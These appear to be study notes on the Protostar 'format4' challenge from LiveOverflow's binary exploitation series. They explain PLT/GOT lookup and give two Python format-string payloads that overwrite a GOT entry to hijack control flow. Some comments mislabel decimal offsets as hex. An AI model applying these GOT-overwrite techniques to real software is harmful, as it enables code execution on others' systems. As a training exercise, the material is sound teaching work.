# LiveOverflow Binary Exploitation / Memory Corruption

### 0x12 PLT and GOT

When a C program using system functions or lib c functions such as printf, the code of these functions are not found within the C program or compiled executable. Instead, these functions will be dynamically linked to the program (use `ldd BINARY` to see all libraries dynamically linked to a binary as well as the path to the library)

This is beneficial as it reduces the size of our C program while lib c itself can receive updates without having all binaries using lib c to recompile on every update.

On modern OS, the address of the lib c library is randomised via ASLR (on Protostar VM, ASLR is not used so every run of `ldd BINARY` results in the same base memory address of dynamically linked libraries)

To allow programs to correctly reference lib c functions even with ASLR, we use Process Linkage Tables (PLTs) and Global Offset Tables (GOTs)

C program &rarr; Assembly Code &rarr; PLT &rarr; GOT &rarr; Location of function in linked library

Vulnerabilities

1. Arbitrary Write - write to GOT such that instead of executing library functions, we execute our own functions

2. Arbitrary Read - even with ASLR, the addresses in GOT is always fixed. Reading entries in GOT allows you to read addresses in lib c which can give you offset values to get the addresses of other functions in lib c. Useful for finding ROPGadgets, Ret2libc, and BoFs.

### 0x13 Format4

Answer 1: `python exploiy.py | /opt/protostar/bin/format4`

```
import struct

redirect = struct.pack("I", 0x80484b4) #address to hello() which we want redirect to
overwrite = struct.pack("I", 0x8049724) #address in GOT  we want to overwrite

exploit = ""
exploit += overwrite
exploit += "%134513840x"
exploit += "%4$n"

print exploit
```

Answer 2: `python exploiy.py | /opt/protostar/bin/format4`

```
import struct

redirect = struct.pack("I", 0x80484b4) #address to hello() which we want redirect to
overwrite = struct.pack("I", 0x8049724) #address in GOT we want to overwrite
overwrite2 = struct.pack("I", 0x8049724+2)

exploit = ""
exploit += overwrite
exploit += overwrite2

exploit += "%33964x%4$n"
exploit += "%33616x%5$n"

# 0x00080008 -> without vals
# 0x84b4 - 0x0008 = 0x33964
# 0x84b484b4 -> after using 0x33964 before %4$n
# 0x10804 - 0x84b4 = 0x33616


print exploit
```

### SSH problem fix (no matching host key type found)

ssh -oHostKeyAlgorithms=+ssh-dss XXX@XXX.XXX.XXX.XX